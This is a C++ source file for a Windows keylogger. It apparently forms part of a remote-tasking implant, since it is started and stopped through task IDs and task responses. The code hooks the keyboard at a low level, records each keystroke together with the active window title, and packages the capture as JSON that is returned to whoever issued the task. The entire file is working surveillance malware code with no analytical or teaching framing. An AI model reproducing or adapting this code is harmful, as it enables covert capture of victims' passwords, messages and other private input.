#include "Keylogger.h"

#include <chrono>

std::atomic<Keylogger *> Keylogger::active_instance{nullptr};

Keylogger::~Keylogger()
{
    keylog_stop();
}

Response Keylogger::keylog_start(const int &taskID)
{
    Keylogger *expected = nullptr;
    if (!active_instance.compare_exchange_strong(expected, this))
    {
        return CreateTaskResponse(taskID, KEYLOGGER_START, NO_CODE, TASK_ERROR,
                                  TaskError{1, "Keylogger is already running."});
    }

    {
        std::lock_guard lock(state_mutex);
        first_json_entry = true;
        keylog_data = "[";
        current_window.clear();
        last_window = NULL;
    }

    logging_enabled = true;
    hook_thread = std::thread(&Keylogger::hook_loop, this);
    return CreateTaskResponse(taskID, KEYLOGGER_START, NO_CODE, RUNNING,
                              TaskSuccess{"Keylogger started successfully."});
}

void Keylogger::hook_loop()
{
    hook_thread_id = GetCurrentThreadId();
    keyboard_hook = SetWindowsHookEx(WH_KEYBOARD_LL, hook_proc, GetModuleHandle(NULL), 0);
    if (keyboard_hook == NULL)
    {
        logging_enabled = false;
        return;
    }

    MSG message;
    while (logging_enabled)
    {
        while (PeekMessage(&message, NULL, 0, 0, PM_REMOVE))
        {
            if (message.message == WM_QUIT)
            {
                logging_enabled = false;
                break;
            }
            TranslateMessage(&message);
            DispatchMessage(&message);
        }
        std::this_thread::sleep_for(std::chrono::milliseconds(10));
    }

    UnhookWindowsHookEx(keyboard_hook);
    keyboard_hook = NULL;
    hook_thread_id = 0;
}

bool Keylogger::keylog_stop()
{
    Keylogger *instance = active_instance.load();
    if (instance != this)
        return false;

    logging_enabled = false;
    if (hook_thread_id != 0)
        PostThreadMessage(hook_thread_id, WM_QUIT, 0, 0);
    if (hook_thread.joinable())
        hook_thread.join();
    active_instance.compare_exchange_strong(instance, nullptr);
    return true;
}

LRESULT CALLBACK Keylogger::hook_proc(int code, WPARAM wParam, LPARAM lParam)
{
    Keylogger *instance = active_instance.load();
    if (code >= 0 && instance != nullptr && instance->logging_enabled)
    {
        const auto *key = reinterpret_cast<KBDLLHOOKSTRUCT *>(lParam);
        HWND current_hwnd = GetForegroundWindow();
        if (current_hwnd != instance->last_window)
        {
            instance->last_window = current_hwnd;
            std::string window = instance->get_active_window_title();
            if (window != instance->current_window)
            {
                instance->current_window = window;
                instance->append_json_event("window", window, window);
            }
        }

        if (wParam == WM_KEYDOWN)
        {
            std::string value;
            switch (key->vkCode)
            {
            case VK_RETURN: value = "(ENTER)\n"; break;
            case VK_BACK: value = "(BACKSPACE)"; break;
            case VK_SPACE: value = " "; break;
            case VK_TAB: value = "(TAB)"; break;
            case VK_SHIFT:
            case VK_LSHIFT:
            case VK_RSHIFT: value = "(SHIFT)"; break;
            case VK_CONTROL:
            case VK_LCONTROL:
            case VK_RCONTROL: value = "(CTRL)"; break;
            case VK_ESCAPE: value = "(ESCAPE)"; break;
            case VK_END: value = "(END)"; break;
            case VK_HOME: value = "(HOME)"; break;
            case VK_LEFT: value = "(LEFT)"; break;
            case VK_UP: value = "(UP)"; break;
            case VK_RIGHT: value = "(RIGHT)"; break;
            case VK_DOWN: value = "(DOWN)"; break;
            case VK_DELETE: value = "(DELETE)"; break;
            default:
            {
                char character = static_cast<char>(MapVirtualKey(key->vkCode, MAPVK_VK_TO_CHAR));
                if (character != 0)
                    value = character;
                break;
            }
            }
            if (!value.empty())
                instance->append_json_event("key", value, instance->current_window);
        }
    }
    return CallNextHookEx(NULL, code, wParam, lParam);
}

Response Keylogger::get_keylog_data(const int &taskID)
{
    keylog_stop();
    std::string result;
    {
        std::lock_guard lock(state_mutex);
        result = keylog_data + "\n]";
        keylog_data = "[";
        first_json_entry = true;
        current_window.clear();
        last_window = NULL;
    }
    return CreateTaskResponse(taskID, KEYLOGGER_STOP, NO_CODE, SUCCESS,
                              TaskSuccess{result});
}

std::string Keylogger::escape_json(const std::string &value)
{
    std::string escaped;
    for (char character : value)
    {
        switch (character)
        {
        case '\\': escaped += "\\\\"; break;
        case '"': escaped += "\\\""; break;
        case '\n': escaped += "\\n"; break;
        case '\r': escaped += "\\r"; break;
        case '\t': escaped += "\\t"; break;
        default: escaped += character; break;
        }
    }
    return escaped;
}

void Keylogger::append_json_event(const std::string &type, const std::string &value,
                                  const std::string &window)
{
    if (!logging_enabled)
        return;
    std::lock_guard lock(state_mutex);
    if (!first_json_entry)
        keylog_data += ",";
    keylog_data += "\n  {\"type\":\"" + escape_json(type) +
                   "\",\"value\":\"" + escape_json(value) +
                   "\",\"window\":\"" + escape_json(window) + "\"}";
    first_json_entry = false;
}

std::string Keylogger::get_active_window_title()
{
    char title[256]{};
    HWND hwnd = GetForegroundWindow();
    GetWindowTextA(hwnd, title, sizeof(title));
    return std::string(title);
}
